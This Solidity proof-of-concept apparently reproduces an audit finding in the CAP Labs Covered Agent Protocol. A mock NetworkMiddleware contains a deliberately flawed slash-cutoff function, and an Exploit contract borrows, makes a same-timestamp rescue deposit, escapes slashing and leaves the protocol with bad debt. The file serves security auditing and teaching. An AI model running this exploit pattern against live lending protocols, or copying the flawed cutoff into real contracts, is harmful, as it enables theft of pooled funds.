// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  CAP Labs Covered Agent Protocol — health vs slashable collateral (Trail of Bits, 2025-05)
    coverage() sums every delegation at block.timestamp. slashTimestamp() is
    max(previous epoch, lastBorrow), and only collateral deposited strictly
    before that cutoff can be slashed. A same-timestamp rescue deposit makes
    the agent look healthy and then walks away unsliced. slashTimestamp is verbatim.
*/

library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }
}

contract MockToken {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 a) external {
        balanceOf[to] += a;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

contract NetworkMiddleware {
    struct AgentData {
        uint48 lastBorrow;
    }

    struct DelegationStorage {
        uint256 epochDuration;
        mapping(address => AgentData) agentData;
    }

    struct Delegation {
        uint256 amount;
        uint48 timestamp;
        bool slashed;
    }

    DelegationStorage internal _storage;
    MockToken public col;
    MockToken public usd;
    mapping(address => Delegation[]) public delegations;
    mapping(address => uint256) public debt;
    uint256 public badDebtBooked;

    constructor(MockToken _col, MockToken _usd) {
        col = _col;
        usd = _usd;
        // One-second epochs so a deposit at timestamp-1 is the previous epoch
        // and a deposit at timestamp is current, with no cheatcode warp.
        _storage.epochDuration = 1;
    }

    function epoch() public view returns (uint256) {
        return block.timestamp / _storage.epochDuration;
    }

    function slashTimestamp(address _agent) public view returns (uint48 _slashTimestamp) {
        DelegationStorage storage $ = _storage;
        _slashTimestamp = uint48(Math.max((epoch() - 1) * $.epochDuration, $.agentData[_agent].lastBorrow)); // @> VULN: cutoff ignores collateral that coverage() still counts
        // FIX: slash every delegation that coverage() includes.
    }

    function delegate(address _agent, uint256 amount, uint48 timestamp) external {
        col.transferFrom(msg.sender, address(this), amount);
        delegations[_agent].push(Delegation({amount: amount, timestamp: timestamp, slashed: false}));
    }

    function borrow(address _agent, uint256 amount) external {
        _storage.agentData[_agent].lastBorrow = uint48(block.timestamp); // @beat:borrow
        debt[_agent] = amount;
        usd.mint(_agent, amount);
    }

    function coverage(address _agent) public view returns (uint256 delegation) {
        uint48 _timestamp = uint48(block.timestamp); // @beat:now
        Delegation[] storage vaults = delegations[_agent];
        for (uint256 i = 0; i < vaults.length; i++) {
            if (vaults[i].timestamp <= _timestamp) delegation += vaults[i].amount;
        }
    }

    function slashableCollateral(address _agent) public view returns (uint256 amount) {
        uint48 cut = slashTimestamp(_agent);
        Delegation[] storage vaults = delegations[_agent];
        for (uint256 i = 0; i < vaults.length; i++) {
            if (vaults[i].timestamp < cut) amount += vaults[i].amount; // @beat:oldonly
        }
    }

    function liquidate(address _agent) external returns (uint256 badDebt) {
        uint256 owed = debt[_agent];
        uint256 can = slashableCollateral(_agent);
        uint256 seized = can > owed ? owed : can;
        Delegation[] storage vaults = delegations[_agent];
        uint256 left = seized;
        for (uint256 i = 0; i < vaults.length && left > 0; i++) {
            if (vaults[i].timestamp < slashTimestamp(_agent) && vaults[i].amount > 0) {
                uint256 take = vaults[i].amount > left ? left : vaults[i].amount;
                vaults[i].amount -= take;
                vaults[i].slashed = true;
                left -= take;
            }
        }
        badDebt = owed - seized;
        badDebtBooked = badDebt; // @beat:book
        debt[_agent] = badDebt;
    }

    function withdrawUnslashable(address _agent, address to) external {
        uint48 cut = slashTimestamp(_agent);
        uint256 ret;
        Delegation[] storage vaults = delegations[_agent];
        for (uint256 i = 0; i < vaults.length; i++) {
            if (!vaults[i].slashed && vaults[i].timestamp >= cut && vaults[i].amount > 0) {
                ret += vaults[i].amount;
                vaults[i].amount = 0;
            }
        }
        col.transfer(to, ret);
    }
}

contract Exploit {
    MockToken public col;
    MockToken public usd;
    NetworkMiddleware public middleware;
    address public agent;
    uint256 public constant OLD = 100 ether;
    uint256 public constant FRESH = 1000 ether;
    uint256 public constant DEBT = 1000 ether;
    uint256 public covered;
    uint256 public slashable;
    uint256 public badDebt;

    constructor() {
        col = new MockToken("col"); // nonce 1
        usd = new MockToken("USD"); // nonce 2
        middleware = new NetworkMiddleware(col, usd); // nonce 3
        agent = address(this);
    }

    function run() external {
        require(block.timestamp >= 1, "ts");
        col.mint(address(this), OLD + FRESH);
        // MockToken has no allowance; transferFrom pulls without a check.
        middleware.delegate(agent, OLD, uint48(block.timestamp - 1)); // @beat:old
        middleware.borrow(agent, DEBT);
        middleware.delegate(agent, FRESH, uint48(block.timestamp)); // @beat:fresh
        covered = middleware.coverage(agent);
        slashable = middleware.slashableCollateral(agent);
        badDebt = middleware.liquidate(agent);
        middleware.withdrawUnslashable(agent, address(this));
        require(covered == OLD + FRESH, "health counts the rescue deposit");
        require(covered >= DEBT, "agent looks healthy");
        require(slashable == OLD, "only the previous-epoch deposit is slashable");
        require(badDebt == DEBT - OLD, "protocol absorbs 900");
        require(usd.balanceOf(address(this)) == DEBT, "borrower keeps the loan");
        require(col.balanceOf(address(this)) == FRESH, "rescue collateral returned");
    }
}
